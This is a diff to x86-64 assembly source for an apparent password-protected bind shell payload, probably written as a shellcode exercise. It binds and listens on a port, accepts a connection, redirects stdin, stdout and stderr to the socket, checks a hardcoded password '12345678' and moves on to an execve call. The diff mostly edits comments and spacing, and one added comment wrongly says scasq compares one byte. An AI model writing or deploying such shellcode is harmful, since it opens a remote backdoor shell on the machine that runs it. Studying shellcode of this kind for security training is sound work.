@@ -38,32 +38,31 @@ _start:
 
 	; Prepare (struct sockaddr *)&server
 	;	RSP will point to the struct address
-	                    ; bzero(&server.sin_zero, 8)
+	                                ; bzero(&server.sin_zero, 8)
 	push rdx			; RDX Zero'ed 4 instructions up
 
-	push rdx
+	push rdx                        ; NULL can be placed as explained
 
 	push word PORT
-
 	push word AF_INET
 	
 	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
 	;	RDI already has the sock_id
 	
-	push 49                 ; Syscall number
+	push 49                          ; Syscall number
 	pop rax
 
-	push rsp                ; @ to (struct sockaddr * &server)
+	push rsp                         ; @ to (struct sockaddr * &server)
 	pop rsi
 
-	mov dl, 16              ; length of the sockaddr struct
+	mov dl, 16                       ; length of the sockaddr struct
 
 	syscall
 
 	; listen(sock, MAX_CLIENTES
 	;	RDI already has the sock_id
 	
-	push 50
+	push 50                           ; Syscall Number
 	pop rax
 
 	push 2
@@ -75,11 +74,11 @@ _start:
 	; 	RDI already has the sock_id
 	;   RSI and RDX gets NULL
 
-	push 43
+	push 43                            ; Syscall Number
 	pop rax
 	
-	xor rsi, rsi			; RSI <- NULL
-	cdq				; RDX <- 0
+	xor rsi, rsi			   ; RSI <- NULL
+	cdq				   ; RDX <- 0
 
 	syscall
 
@@ -90,61 +89,57 @@ _start:
 	; CODE REMOVED - Close the parent socket_id
 
 	; Sockets duplication
-
-	;;mov rdi, rbx			; RDI <- Client socket_id
-	;push rbx
-	;pop rdi
-
 	push 2
 	pop rsi
-loop_1:					; RDI alreadu has the client_sock id
+loop_1:					     ; RDI already has the client_sock id
 	push 33
 	pop rax
 	
 	syscall
 
 	dec rsi
-	jns loop_1
+	jns loop_1                           ; Done stdin, stderr and stdout? No? Jump to bucle
 
 	; Here starts the password stuff
 password_check:
 
 write_syscall:
 
-        push 1                  ; Write Syscall
+        push 1                                ; Write Syscall
         pop rax
 
         ; rdi still keeps the sicket_id, we write() to the socket
 
-        mov r9, "Passwd: "      ;  Rel addressing to prompt      
+        mov r9, "Passwd: "                    ;  Rel addressing to prompt      
         push r9
         mov rsi, rsp
 
-        push 8                  ; Length "Passwd: " string
+        push 8                                ; Length "Passwd: " string
         pop rdx
 
         syscall
 
 read_syscall:
-
-        xor rax, rax                            ; Syscall number for read()
+        ; RDI keeps the socket_id value
+	; RDX already has value 8 from before
+	
+        xor rax, rax                           ; Syscall number for read()
+	
         ; rdi keeps the socket_id, we read() from it
 
         ; Where to store the input passwd
-        add rsi, 8                              ; Replace "Passwd: " with the input in the stack
-
-        ;rdx already has value 8 from before
+        add rsi, 8                             ; "Passwd: " string is replaced with the input
 
         syscall
 
 compare_passwords:
 
-        mov rax, "12345678"                     ; Thgis is the password
+        mov rax, "12345678"                     ; This is the password
 
         push rsi                                ; rsi points to PASSWD_INPUT
-        pop rdi
+        pop rdi                                 ; scasq needs rdi 
 
-        scasq
+        scasq                                   ; Compare RAX with [rdi] (1 byte)
         jne exit_program                        ; Passwords don't match, exit
 
 	; execve SYSCALL
